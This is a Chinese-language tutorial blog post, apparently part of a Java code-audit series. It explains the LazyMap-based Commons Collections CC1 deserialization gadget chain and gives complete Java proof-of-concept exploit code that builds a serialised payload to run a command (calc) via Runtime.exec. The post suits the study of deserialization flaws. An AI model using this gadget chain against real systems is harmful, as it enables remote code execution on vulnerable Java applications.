---
title: 正版cc1链
date: 2026-08-03 15:10:43
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## 正版cc1链

漏洞的重点还是InvokeTransformer的 `transform` 方法

之前我们所讲的是 `TransformedMap` 的链子，今天我们去追正版 CC1 链里面 `LazyMap` 的链子

![image-20260803110656287](/images/java-code-audit/16-正版cc1链/20260803110656494.png)

我们看到这里，是 `LazyMap` 这个类的 `get` 方法中出现了 `.transform` 方法。`get` 方法的作用域为 public。

在找 `factory` 的时候偶然发现了 `decorate` 方法，这个 `decorate` 方式与我们之前讲的 `TransformMap` 中的 `decorate` 方法是一样的作用。

![image-20260803110833343](/images/java-code-audit/16-正版cc1链/20260803110833405.png)

先看这个类的构造函数，作用域为 `private`，因为无法直接获取，而 `decorate` 方法里面能够 new 一个 `LazyMap` 对象，于是我们构造如下的 EXP，来证明这条链子暂时是可行的。

```java
public static void main(String[] args) throws Exception {
    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    HashMap<Object, Object> hashMap = new HashMap<>();
    Map decorate = LazyMap.decorate(hashMap, invokerTransformer);
    Class<LazyMap> lazyMapClass = LazyMap.class;
    Method get = lazyMapClass.getDeclaredMethod("get", Object.class);
    get.setAccessible(true);
    get.invoke(decorate,runtime);
}
```

往上走，我们去找一找谁调用了 `LazyMap.get()`

最终在 `AnnotationInvocationHandler.invoke()` 方法中找到了有一个地方调用了 `get()` 方法。

![image-20260803115357519](/images/java-code-audit/16-正版cc1链/20260803115357732.png)

同时这个类也非常好，它里面有 `readObject()` 方法，可以作为我们的入口类。

- 现在的关键点在于我们要触发 `AnnotationInvocationHandler.invoke()`

需要触发 `invoke` 方法，马上想到动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 `invoke()` 方法。我们去找一找能利用的地方

在这里调用了 `entrySet()` 方法，也就是说，如果我们将 `memberValues` 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 `invoke()` 方法，最终完成整条链子的调用。

![image-20260803142851529](/images/java-code-audit/16-正版cc1链/20260803142851712.png)

在这里调用了 `entrySet()` 方法，也就是说，如果我们将 `memberValues` 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 `invoke()` 方法，最终完成整条链子的调用。

```java
package com.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class cc_z1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke"
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()
                , new Class[]{Map.class}, invocationHandler);
        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);

        serialize(invocationHandler);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```